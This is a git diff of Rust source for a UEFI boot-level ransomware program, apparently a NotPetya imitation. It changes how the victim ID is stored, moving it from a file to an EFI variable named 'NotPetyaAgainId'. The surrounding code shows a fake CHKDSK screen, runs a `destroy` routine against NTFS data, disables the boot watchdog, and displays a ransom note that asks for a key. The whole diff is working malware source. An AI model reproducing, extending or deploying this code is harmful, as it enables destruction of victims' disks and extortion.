@@ -7,16 +7,19 @@ extern crate alloc;
 use alloc::string::String;
 use core::fmt::Write;
 use core::str;
+
+use log::info;
 use uefi::prelude::*;
 use uefi::proto::console::text::{Color, Key};
 use uefi::table::runtime::ResetType;
 use uefi::{Char16, Event};
 
-use crate::file::read_file;
+use crate::efi_vars::{read_var, write_var};
 use crate::ntfs::destroy;
 use crate::recover::recover;
 
 mod efi_rng;
+mod efi_vars;
 mod file;
 mod ntfs;
 mod recover;
@@ -31,26 +34,14 @@ fn init_chdsk_screen(st: &mut SystemTable<Boot>) -> uefi::Result {
     Ok(())
 }
 
-fn init_ransom_screen(st: &mut SystemTable<Boot>) -> uefi::Result {
+fn init_ransom_screen(st: &mut SystemTable<Boot>, id: &str) -> uefi::Result {
     st.stdout().clear()?;
     st.stdout().enable_cursor(true)?;
     st.stdout().set_color(Color::Red, Color::Black)?;
     st.stdout()
         .write_str(include_str!("include/ransom_note.txt"))
         .unwrap();
-
-    match read_file(st, "id") {
-        Ok(buf) => {
-            let content = str::from_utf8(&buf).unwrap();
-            st.stdout().write_str(content).unwrap();
-        }
-        Err(_) => {
-            st.stdout()
-                .write_str("ID not found, sorry no recovery for you")
-                .unwrap();
-        }
-    }
-
+    st.stdout().write_str(id).unwrap();
     st.stdout().write_str("\n\nEnter key here\n> ").unwrap();
 
     Ok(())
@@ -60,6 +51,7 @@ fn take_input(
     system_table: &mut SystemTable<Boot>,
     char_16: Char16,
     buffer: &mut String,
+    id: &str,
 ) -> uefi::Result {
     let mut st = unsafe { system_table.unsafe_clone() };
     let stdout = system_table.stdout();
@@ -69,7 +61,7 @@ fn take_input(
         '\r' => {
             if buffer == "clear" {
                 stdout.clear()?;
-                init_ransom_screen(&mut st)?;
+                init_ransom_screen(&mut st, id)?;
                 buffer.clear();
             } else if buffer == "shutdown" {
                 system_table.runtime_services().reset(
@@ -106,8 +98,8 @@ fn wait_for_input(boot_services: &BootServices, events: &mut [Event; 1]) {
     boot_services.wait_for_event(events).unwrap();
 }
 
-fn shell_land(st: &mut SystemTable<Boot>) -> uefi::Result {
-    init_ransom_screen(st)?;
+fn shell_land(st: &mut SystemTable<Boot>, id: &str) -> uefi::Result {
+    init_ransom_screen(st, id)?;
 
     let mut buffer: String = String::from("");
     let mut key_event = unsafe { [st.stdin().wait_for_key_event().unsafe_clone()] };
@@ -115,7 +107,7 @@ fn shell_land(st: &mut SystemTable<Boot>) -> uefi::Result {
     loop {
         wait_for_input(st.boot_services(), &mut key_event);
         if let Some(Key::Printable(key)) = st.stdin().read_key()? {
-            take_input(st, key, &mut buffer)?;
+            take_input(st, key, &mut buffer, id)?;
         }
     }
 }
@@ -127,22 +119,27 @@ fn main(_handle: Handle, mut st: SystemTable<Boot>) -> Status {
     // Disable the 5 min timeout
     st.boot_services().set_watchdog_timer(0, 65536, None)?;
 
-    if read_file(&st, "id").is_err() {
-        // Print CHDSK message
-        init_chdsk_screen(&mut st)?;
+    let mut id_buf = [0u8; 64];
+    let id_buf = match read_var(&st, "NotPetyaAgainId", &mut id_buf) {
+        Ok(buf) => buf,
+        Err(_) => {
+            // Print CHDSK message
+            init_chdsk_screen(&mut st)?;
 
-        // Speak for it self
-        match destroy(&st) {
-            Ok(_) => {}
-            Err(e) => {
-                log::info!("{:?}", e);
-                loop {}
-            }
-        };
-    }
+            // Speak for it self
+            match destroy(&st) {
+                Ok(_) => {}
+                Err(e) => {
+                    info!("{:?}", e);
+                    loop {}
+                }
+            };
+            read_var(&st, "NotPetyaAgainId", &mut id_buf).unwrap()
+        }
+    };
 
-    // Go to shell with ransom note
-    shell_land(&mut st)?;
+    let id = str::from_utf8(id_buf).unwrap();
+    shell_land(&mut st, id)?;
 
     Status::SUCCESS
 }
